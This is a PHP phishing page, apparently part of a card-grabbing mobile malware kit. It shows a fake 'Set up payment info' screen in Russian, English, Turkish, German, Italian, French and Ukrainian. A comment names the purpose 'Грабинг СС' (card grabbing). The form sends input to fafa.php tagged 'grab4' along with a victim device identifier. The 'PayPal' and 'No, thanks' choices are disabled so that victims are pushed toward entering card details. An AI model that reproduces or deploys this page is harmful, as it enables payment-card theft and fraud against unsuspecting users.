<!DOCTYPE html><html><head><meta charset="utf-8"/>
<title>some</title>
<meta name="viewport"content="width=device-width, initial-scale=1">
<link rel="stylesheet"href="css/bootstrap.css"type="text/css"media="all"/>
</head>
<body>


<style>
   p.dline {
    line-height: 1.5;
   }
   P {
    line-height: 1.2em;
   }
  </style>

<?php


		//$IM = "321|ru";
		//$country = "us";
		//$IMEI = "$IM|$country|Грабинг СС";

		$IM = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
		$masС = explode("|", $IM);
		$country = $masС[1];
		$IMEI = "$IM";

	if($country=="ru"){
		$header="Укажите платежные данные";
		$text1="Введите платежную информацию.";
		$text2="Средства будут списываться с вашего счета только при покупке.";
		$radio1="Добавить кредитную или дебетовую карту";
		$radio2="Добавить PayPal";
		$radio3="Нет, спасибо";
		$button="Продолжить";
	}elseif($country=="us"){
		$header="Set up payment info";
		$text1="Enter your billing information.";
		$text2="You won't be charged unless you make a purchase.";
		$radio1="Add credit or debit card";
		$radio2="Add PayPal";
		$radio3="No, thanks";
		$button="CONTINUE";
	}elseif($country=="tr"){
		$header="Ödeme bilgisi ayarlama";
		$text1="Fatura bilgilerinizi girin.";
		$text2="Satın almadığınız sürece sizden ücret alınmaz.";
		$radio1="Kredi kartı veya bankamatik kartı ekle";
		$radio2="PayPal ekle";
		$radio3="Hayır teşekkürler";
		$button="DEVAM ET";
	}elseif($country=="de"){
		$header="Zahlungsinformationen einrichten";
		$text1="Geben Sie ihre Rechnungsdaten ein.";
		$text2="Sie werden nicht belastet, es sei denn, Sie machen einen Kauf.";
		$radio1="Kredit- oder Debitkarte hinzufügen";
		$radio2="PayPal hinzufügen";
		$radio3="Nein Danke";
		$button="FORTSETZEN";
	}elseif($country=="it"){
		$header="Imposta i dati di pagamento";
		$text1="Inserisci le tue informazioni di fatturazione.";
		$text2="Non ti verrà addebitato alcun costo se non compri un acquisto.";
		$radio1="Aggiungi carta di credito o di debito";
		$radio2="Aggiungi PayPal";
		$radio3="No grazie";
		$button="CONTINUA";
	}elseif($country=="fr"){
		$header="Configurer les informations de paiement";
		$text1="Entrez vos informations de facturation.";
		$text2="Vous ne serez facturé que si vous faites un achat.";
		$radio1="Ajouter une carte de crédit ou de débit";
		$radio2="Ajouter PayPal";
		$radio3="Non merci";
		$button="CONTINUER";
	}elseif($country=="ua"){
		$header="Налаштуйте платіжну інформацію";
		$text1="Введіть свою платіжну інформацію.";
		$text2="З вас не стягуватиметься плата, якщо ви не зробите покупку.";
		$radio1="Додайте кредитну чи дебетову картку";
		$radio2="Додайте PayPal";
		$radio3="Ні, дякую";
		$button="ПРОДАТИ";
	}else{
		$header="Set up payment info";
		$text1="Enter your billing information.";
		$text2="You won't be charged unless you make a purchase.";
		$radio1="Add credit or debit card";
		$radio2="Add PayPal";
		$radio3="No, thanks";
		$button="CONTINUE";
	}


?>

<div style="background: #5391f6; width: 100%; height: 117px">
	<img src="images/iconcard.png" style="height:110%; margin-top:0px;  margin-right: 0px;" align="right"/>
</div>
<div style="background: #366ad7; width: 100%; height: 85px">
	<p class="text-muted" style=" color:#fff;margin-left: 30px;  border:12px double transparent; font-family: Calibri;font-size: 23px; ">
		<?php echo "$header";?>
	</p>
</div>


<?php
echo "<form action=\"fafa.php?p=$IMEI&f=grab4\" method=\"post\">";


		echo "<p style='color:#000;margin-top:-20px; border:34px double transparent; font-family: Calibri;font-size: 17px;'>
		$text1</br>
		<B>$text2</B></p>";
?>

  <div style='color:#000;margin-top:-60px; border:34px double transparent; font-family: Calibri;font-size: 17px;'>


	   <input type="radio" checked="true" name="web" value="rad1"/>
	   <div style='margin-left:25px;margin-top:-26px;color:#000; border:1px double transparent; font-family: Calibri;font-size: 17px;'>
	   <p><?php echo "$radio1";?></p>
	   </div>

	   <input type="radio" disabled="true" name="web" value="rad2" style="margin-top:10px"/>
	   <div style='margin-left:25px;margin-top:-24px;color:#000; border:1px double transparent; font-family: Calibri;font-size: 17px;'>
	   <p><?php echo "$radio2";?></p>
	   </div>

	   <input type="radio" disabled="true" name="web" value="rad3" style="margin-top:10px"/>
	   <div style='margin-left:25px;margin-top:-24px;color:#000; border:1px double transparent; font-family: Calibri;font-size: 17px;'>
       <p><?php echo "$radio3";?></p> </br>
	   </div>
  </div>

<center>
<input type="submit" id="goo" value="<?php echo "$button";?>" name="goo" class="btn btn-default" style="margin-top: 10px; "/>
</center>
</br>
</form>

</body>
</html>
